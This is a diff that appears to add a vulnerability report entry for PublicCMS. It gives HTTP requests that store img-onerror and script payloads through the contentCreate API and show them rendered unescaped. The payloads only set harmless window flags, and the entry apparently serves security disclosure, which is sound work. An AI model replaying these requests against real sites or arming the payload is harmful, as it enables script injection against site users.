@@ -1,0 +1,15 @@
+### VULN-004 — stored XSS via unsanitized API/web content-save (base64=false) + ?no_esc template
+
+### Store the payload (API channel; base64=false => NOT sanitized). Precondition: appToken + user token.
+GET /api/contentCreate?categoryId=14&modelId=article&title=XSSPOC_<S>&text=<img%20src=x%20onerror=window.__xss_<S>=1>%20<script>window.__xss2_<S>=1</script> HTTP/1.1
+Host: site2.dev.publiccms.com
+appToken: <app-token>
+authToken: <contributor-user-token>
+authUserId: <contributor-id>
+### -> 200 {"result":"success","contentId":"<id>"}
+### DB: cms_content_attribute.text stores the payload verbatim.
+
+### View the content -> payload emitted UNESCAPED, executes in a browser
+GET /content/<id> HTTP/1.1
+Host: site2.dev.publiccms.com
+### -> <div class="content"> <img src=x onerror=window.__xss_<S>=1> <script>window.__xss2_<S>=1</script> </div>
